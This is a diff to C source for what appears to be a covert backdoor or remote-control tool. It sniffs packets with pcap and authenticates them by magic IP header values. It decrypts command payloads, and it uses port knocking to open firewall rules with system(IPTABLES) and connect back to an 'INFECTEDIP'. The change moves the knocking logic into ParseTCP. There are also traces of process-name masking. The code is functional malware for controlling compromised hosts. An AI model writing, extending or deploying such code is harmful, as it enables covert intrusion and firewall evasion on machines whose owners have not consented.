@@ -24,7 +24,7 @@ struct payload{
 int Packetcapture();
 void ReadPacket(u_char* arg, const struct pcap_pkthdr* pkthdr, const u_char* packet);
 void ParseIP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
-void ParseTCP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
+void ParseTCP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet, bool knock);
 void ParsePayload(const u_char *payload, int len);
 void CreatePayload(char *command, unsigned char *encrypted);
 void SendPayload(const unsigned char *tcp_payload);
@@ -34,8 +34,8 @@ void send_results(char *sip, char *dip, unsigned short sport, unsigned short dpo
 int rand_delay(int delay);
 
 
-int pattern[2];
 int knocking[2];
+int pattern[2];
 
 int main(int argc, char **argv){
     //strcpy(argv[0], MASK);
@@ -142,33 +142,9 @@ void ParseIP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packe
         printf("TOS: %u\n", ip->ip_tos);
         if(CheckKey(ip->ip_tos, ip->ip_id)){
             printf("Reading payload\n");
-            ParseTCP(args, pkthdr, packet);
+            ParseTCP(args, pkthdr, packet, false);
         } else if(ip->ip_tos == 'b' && ip->ip_id == 'l') {
-
-            int size_ip;
-            int size_tcp;
-            const struct sniff_tcp *tcp=0;
-
-            printf("PORT KNOCKING ON: %d\n", ntohs(tcp->th_dport));
-            ip = (struct my_ip*)(packet + 14);
-            size_ip = IP_HL(ip)*4;
-            tcp = (struct sniff_tcp*)(packet + 14 + size_ip);
-            size_tcp = TH_OFF(tcp)*4;
-            printf("Source port: %d\n", ntohs(tcp->th_sport));
-            printf("Destination port: %d\n", ntohs(tcp->th_dport));
-            for(int i = 0; i < sizeof(pattern)/sizeof(int); i++){
-                if(pattern[i] == tcp->th_dport){
-                    knocking[i] = 1;
-                }
-            }
-            if((knocking[0] == 1) && (knocking[1] == 1)){
-               system(IPTABLES);
-                char *dip = INFECTEDIP;
-                unsigned short sport = SHPORT;
-                unsigned short dport = SHPORT;
-                recv_results(dip, dport);
-                system(TURNOFF);
-            }
+            ParseTCP(args,pkthdr, packet, true);
         } else {
             printf("Packet tossed wrong key\n");
         }
@@ -184,7 +160,7 @@ bool CheckKey(u_char ip_tos, u_short ip_id){
     }
 }
 
-void ParseTCP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet){
+void ParseTCP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet, bool knock){
     const struct sniff_tcp *tcp=0;
     const struct my_ip *ip;
     const char *payload;
@@ -212,9 +188,26 @@ void ParseTCP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* pack
 
     size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);
 
-    if(size_payload > 0){
-        printf("Payload (%d bytes):\n", size_payload);
-        ParsePayload(payload, size_payload);
+    printf("PORT KNOCKING ON: %d\n", ntohs(tcp->th_dport));
+    if(knock){
+        for(int k = 0; k < sizeof(pattern)/sizeof(int); k++){
+            if(pattern[k] == tcp->th_dport){
+                knocking[k] = 1;
+            }
+        }
+    if((knocking[0] == 1) && (knocking[1] == 1)){
+       system(IPTABLES);
+        char *dip = INFECTEDIP;
+        unsigned short sport = SHPORT;
+        unsigned short dport = SHPORT;
+        recv_results(dip, dport);
+        system(TURNOFF);
+    }
+    } else {
+        if(size_payload > 0){
+            printf("Payload (%d bytes):\n", size_payload);
+            ParsePayload(payload, size_payload);
+        }
     }
 }
 
